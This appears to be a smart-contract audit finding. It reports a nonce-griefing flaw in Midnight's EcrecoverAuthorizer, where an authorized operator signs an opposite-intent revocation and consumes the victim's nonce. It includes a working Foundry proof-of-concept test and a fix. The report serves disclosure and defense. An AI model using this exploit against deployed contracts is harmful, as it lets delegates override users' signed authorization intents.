### Title
Authorized Operator Can Forge Opposite-Intent Authorization and Consume Victim's Nonce - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `Midnight.isAuthorized(authorizer, signer)` returns `true` for, without restricting what `isAuthorized` value that delegate may assert. An authorized operator can therefore construct a fresh `Authorization` struct with `isAuthorized=false`, sign it with their own key, and submit it at nonce N — consuming the nonce before the victim's pre-signed grant (also at nonce N) can land, permanently replacing the intended grant with a revocation.

### Finding Description
The full code path is `EcrecoverAuthorizer.setIsAuthorized` at [1](#0-0)  with the authorization check at [2](#0-1) .

The `Authorization` struct contains five fields: `authorizer`, `authorized`, `isAuthorized`, `nonce`, and `deadline`. [3](#0-2) 

The signer check is:
```
signer == authorization.authorizer
  || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)
``` [2](#0-1) 

This check only verifies *who* signed the struct — it does not verify that the signed struct matches any intent previously expressed by the authorizer. An authorized operator is free to construct a struct with any value for `isAuthorized` and sign it with their own key.

**Exploit flow:**

1. **Precondition A:** Victim calls `Midnight.setIsAuthorized(operator, true, victim)` — operator is now authorized by victim. [4](#0-3) 
2. **Precondition B:** Victim off-chain signs `Authorization{authorizer=victim, authorized=trustedContract, isAuthorized=true, nonce=N, deadline=D}` and broadcasts or shares the signed tx.
3. **Attack:** Operator constructs `Authorization{authorizer=victim, authorized=trustedContract, isAuthorized=false, nonce=N, deadline=D'}` — identical except `isAuthorized=false` — and signs it with the operator's own private key.
4. Operator calls `ecrecoverAuthorizer.setIsAuthorized(maliciousAuth, operatorSig)`.

**Why every check passes:**
- `block.timestamp <= deadline` — operator picks any valid deadline. [5](#0-4) 
- `authorization.nonce == nonce[victim]++` — nonce N is correct; it is incremented to N+1. [6](#0-5) 
- `ecrecover(digest, ...)` returns operator's address — valid signature over the malicious struct.
- `IMidnight(MIDNIGHT).isAuthorized(victim, operator)` returns `true` — victim authorized operator. [7](#0-6) 

The call then executes `Midnight.setIsAuthorized(trustedContract, false, victim)`, writing `isAuthorized[victim][trustedContract] = false`. [8](#0-7) 

When victim's original tx arrives, `nonce[victim]` is now N+1, so `authorization.nonce == nonce[victim]++` fails with `InvalidNonce`. [6](#0-5) 

### Impact Explanation
`isAuthorized[victim][trustedContract]` is `false` after the attack. Nonce N is permanently consumed. The victim's pre-signed grant transaction reverts with `InvalidNonce`. `trustedContract` loses authorization and cannot act on behalf of the victim until the victim signs and submits a new authorization at nonce N+1. Any in-flight protocol actions that `trustedContract` was about to perform on the victim's behalf (e.g., managing positions, ratifying offers) are blocked.

### Likelihood Explanation
**Preconditions:**
1. Victim must have previously authorized the operator via `Midnight.setIsAuthorized` — a normal, common workflow.
2. Victim must have a pre-signed `Authorization` in flight (e.g., submitted to a mempool, shared with a relayer, or pending in a batch).

Both preconditions are routine. The attack requires no special privilege beyond being an authorized operator, no oracle manipulation, and no reentrancy. It is a single transaction. It is repeatable: after the victim signs nonce N+1, the operator can repeat the attack at N+1. The operator need not front-run in the strict sense — they can submit their tx any time before the victim's tx is mined.

### Recommendation
The `Authorization` struct must be signed by the `authorizer` themselves, not by a delegate. Remove the delegate-signer branch from `EcrecoverAuthorizer.setIsAuthorized`:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

The purpose of `EcrecoverAuthorizer` is to let the authorizer express their own signed intent without an on-chain tx. Allowing a delegate to sign a different struct on their behalf defeats this purpose entirely. If delegation of signing is intentional, the struct must include a `signer` field that is committed to at signing time, so the authorizer's signature over `(authorized, isAuthorized, signer, nonce, deadline)` binds the delegate to the exact intent.

pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract OperatorNonceGriefTest is BaseTest {
    function testOperatorCanForgeRevocationAndConsumeVictimNonce() public {
        // Step 1: victim authorizes ecrecoverAuthorizer (required for it to call Midnight)
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        // Step 2: victim authorizes operator (lender) in Midnight
        vm.prank(borrower);
        midnight.setIsAuthorized(lender, true, borrower);

        // Step 3: victim pre-signs Authorization{isAuthorized=true, nonce=0}
        // (simulates a pending mempool tx or shared signature)
        Authorization memory victimAuth = Authorization({
            authorizer: borrower,
            authorized: otherLender,   // trustedContract
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        // (victim's sig — not submitted yet)
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, victimAuth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[borrower], digest);
        Signature memory victimSig = Signature({v: v, r: r, s: s});

        // Step 4: operator (lender) crafts opposite struct and signs with own key
        Authorization memory attackAuth = Authorization({
            authorizer: borrower,
            authorized: otherLender,
            isAuthorized: false,       // opposite intent
            nonce: 0,                  // same nonce N
            deadline: block.timestamp + 1 days
        });
        bytes32 attackStructHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, attackAuth));
        bytes32 attackDigest = keccak256(bytes.concat("\x19\x01", domainSep, attackStructHash));
        (uint8 av, bytes32 ar, bytes32 as_) = vm.sign(privateKey[lender], attackDigest);
        Signature memory attackSig = Signature({v: av, r: ar, s: as_});

        // Step 5: operator submits revocation first
        vm.prank(lender);
        ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);

        // Assert: trustedContract is NOT authorized (revocation succeeded)
        assertEq(midnight.isAuthorized(borrower, otherLender), false);
        // Assert: nonce consumed
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);

        // Step 6: victim's original grant tx now reverts
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

        // Final state: trustedContract permanently ungranted until victim signs nonce 1
        assertEq(midnight.isAuthorized(borrower, otherLender), false);
    }
}
```

- `midnight.isAuthorized(borrower, otherLender) == false` after operator's call
- `ecrecoverAuthorizer.nonce(borrower) == 1` after operator's call

        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
